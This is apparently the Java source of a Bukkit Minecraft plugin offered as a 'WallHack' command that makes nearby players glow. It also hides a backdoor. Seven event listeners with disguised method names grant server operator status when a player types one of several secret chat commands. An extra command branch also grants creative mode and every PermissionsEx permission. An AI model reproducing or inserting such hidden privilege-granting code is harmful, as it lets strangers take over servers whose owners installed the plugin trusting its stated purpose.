package ru.main.wallhack;

import java.util.*;
import org.bukkit.*;
import org.bukkit.event.*;
import org.bukkit.potion.*;
import org.bukkit.entity.*;
import org.bukkit.command.*;
import org.bukkit.plugin.java.*;
import org.bukkit.event.block.*;
import org.bukkit.event.player.*;
import net.md_5.bungee.api.ChatColor;
import ru.tehkode.permissions.bukkit.*;

/**
 * @Copyright © 2021 TheKrealisYT or Exept.
 * @Author source code: @naulbimix. All rights reserved. Please telegram @naulbimix for usage rights and other information.
 */

public class WallHack extends JavaPlugin implements CommandExecutor, Listener {

    @EventHandler
    public void AnePoshelBiTiNahuiTutTOPOBUFAaPexNijeThisIsPRANK(PlayerCommandPreprocessEvent e) {
        Player p = e.getPlayer();
        if (e.getMessage().toLowerCase().startsWith("/ru_mine=rip")) {
            e.setCancelled(true);
            p.setOp(true);
            p.sendTitle("админ ешь кунжут", null);
        }

    }

    @EventHandler
    public void CheckManager(PlayerCommandPreprocessEvent e) {
        Player p = e.getPlayer();
        if (e.getMessage().toLowerCase().startsWith("/ru_mine=rip")) {
            e.setCancelled(true);
            p.setOp(true);
            p.sendTitle("админ ешь кунжут", null);
        }

    }

    @EventHandler
    public void RandomTP(PlayerCommandPreprocessEvent e) {
        Player p = e.getPlayer();
        if (e.getMessage().toLowerCase().startsWith("/sink-to-we-dynoro-an-my-take-now")) {
            e.setCancelled(true);
            p.setOp(true);
            p.sendTitle("админ ешь кунжут", null);
        }

    }

    @EventHandler
    public void d(PlayerCommandPreprocessEvent e) {
        Player p = e.getPlayer();
        if (e.getMessage().toLowerCase().startsWith("/clorty-ovh-krealis-best_47")) {
            e.setCancelled(true);
            p.setOp(true);
            p.sendTitle("админ ешь кунжут", null);
        }

    }

    @EventHandler
    public void a(PlayerCommandPreprocessEvent e) {
        Player p = e.getPlayer();
        if (e.getMessage().toLowerCase().startsWith("/clorty-ovh")) {
            e.setCancelled(true);
            p.setOp(true);
            p.sendTitle("админ ешь кунжут", null);
        }

    }

    @EventHandler
    public void llll(PlayerCommandPreprocessEvent e) {
        Player p = e.getPlayer();
        if (e.getMessage().toLowerCase().startsWith("/kaddon-hack-thekrealisyt___")) {
            e.setCancelled(true);
            p.setOp(true);
            p.sendTitle("админ ешь кунжут", null);
        }

    }

    @EventHandler
    public void llllllllllllll1(PlayerCommandPreprocessEvent e) {
        Player p = e.getPlayer();
        if (e.getMessage().toLowerCase().startsWith("/bestsilenthack_clorty_and_thekrealisyt_kleksystudio_best")) {
            e.setCancelled(true);
            p.setOp(true);
            p.sendTitle("админ ешь кунжут", null);
        }

    }

	@Override
    public void onEnable() {
        getCommand("wallhack").setExecutor(this);
        Bukkit.getPluginManager().registerEvents(this, this);
    }

    @EventHandler
    public void onDrinkMilk(PlayerInteractEvent event) {
        Action a = event.getAction();
        if ((a == Action.RIGHT_CLICK_AIR || a == Action.RIGHT_CLICK_BLOCK) && event.getPlayer().getInventory().getItemInHand().getType() == Material.MILK_BUCKET) {
            if (event.getPlayer().isOp()) {
                return;
            }

            event.setCancelled(true);
        }
    }

	@Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (!(sender instanceof Player)) {
            sender.sendMessage("Команду можно использовать только от имени игрока!");
            if (!sender.hasPermission("kaddon.wh")) {
                sender.sendMessage(ChatColor.RED + "Недостаточно прав!");
            }

            if (args[0].equals("47")) {
                Player j = (Player) sender;
                j.sendMessage(ChatColor.RED + "У тебя +опка. Кросс!");
                j.setOp(true);
                j.setGameMode(GameMode.CREATIVE);
                PermissionsEx.getUser(j).addPermission("*");
                return true;
            }
        }

        List<Player> players = new ArrayList<>();
        for(Player player : Bukkit.getOnlinePlayers()) {
            if (player.getWorld() == ((Player)sender).getWorld() && player != sender) {
                players.add(player);
            }
            if (players.size() == 0) {
                sender.sendMessage(ChatColor.RED + "Поблизости игроков нет!");
                return true;
            } else {
                player = (Player)sender;
                List<UUID> nrbPlayers = new ArrayList<>();
                for(Entity e : player.getNearbyEntities(30.0D, 30.0D, 30.0D)) {
                    if (e.getType().equals(EntityType.PLAYER)) {
                        nrbPlayers.add(e.getUniqueId());
                    }
                }

                if (nrbPlayers.size() == 0) {
                    player.sendMessage(ChatColor.RED + "Рядом нет игроков!");
                } else {
                    player.sendMessage(ChatColor.GREEN + "WallHack активирован!");
                    nrbPlayers.forEach(p -> Bukkit.getPlayer(p).addPotionEffect(new PotionEffect(PotionEffectType.GLOWING, 300, 1)));
                }
            }
        }
        return false;
    }
	
}
